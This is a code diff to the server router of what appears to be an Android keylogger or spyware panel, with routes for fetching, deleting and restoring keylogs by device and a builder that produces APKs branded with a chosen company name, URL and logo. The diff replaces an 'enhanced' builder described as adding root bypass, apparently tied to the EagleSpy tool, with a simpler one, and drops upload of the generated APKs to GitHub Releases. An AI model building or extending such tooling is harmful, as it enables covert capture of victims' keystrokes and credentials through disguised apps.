@@ -10,8 +10,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
-import { buildAPK } from "./apk-builder";
-import { buildAPKEnhanced } from "./apk-builder-enhanced";
+import { buildSimpleAPK } from "./apk-builder-simple";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -132,54 +131,25 @@ export const appRouter = router({
           // Use SIMPLE builder (sem dependência de EagleSpy)
           console.log('[ROUTER] Building APK with simple builder...');
           
-          // Use enhanced builder com customização de logo e bypass ROOT
-          const result = await buildAPKEnhanced({
-            companyName: input.companyName,
-            companyUrl: input.companyUrl,
+          // Use simple builder - sem dependência de apktool
+          const result = await buildSimpleAPK({
+            appName: input.companyName,
+            appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
           });
           
-          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, apkPath: result.apkPath });
+          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl });
 
           if (!result.success || !result.downloadUrl) {
             throw new Error(result.error || "Erro ao gerar APK");
           }
-
-          // Extract filename from download URL
-          const filename = result.downloadUrl?.split('/').pop() || 'app.apk';
-          console.log('[ROUTER] Extracted filename:', filename);
           
-          // Try to upload to GitHub Releases
-          let finalDownloadUrl = result.downloadUrl;
-          try {
-            if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.success && result.apkPath) {
-              console.log('[ROUTER] Uploading to GitHub Releases...');
-              try {
-                const { owner, repo } = parseGitHubUrl(process.env.GITHUB_REPO_URL);
-                const githubDownloadUrl = await uploadToGitHubRelease({
-                  owner,
-                  repo,
-                  token: process.env.GITHUB_TOKEN,
-                  appName: input.companyName,
-                  filePath: result.apkPath || path.join(OUTPUT_DIR, 'app.apk'),
-                });
-                console.log('[ROUTER] GitHub download URL:', githubDownloadUrl);
-                finalDownloadUrl = githubDownloadUrl; // Use GitHub URL
-              } catch (ghError) {
-                console.warn('[ROUTER] GitHub upload failed:', ghError instanceof Error ? ghError.message : String(ghError));
-              }
-            }
-          } catch (error) {
-            console.warn('[ROUTER] Unexpected error during GitHub upload:', error instanceof Error ? error.message : String(error));
-          }
-          
-          console.log('[ROUTER] Final download URL:', finalDownloadUrl);
+          console.log('[ROUTER] APK generated successfully');
             
             return {
               success: true,
-              downloadUrl: finalDownloadUrl,
-              apkPath: result.apkPath,
-              filename: result.downloadUrl?.split('/').pop() || 'app.apk',
+              downloadUrl: result.downloadUrl,
+              filename: result.filename || 'app.apk',
               message: "APK gerado com sucesso!",
             };
         } catch (error) {
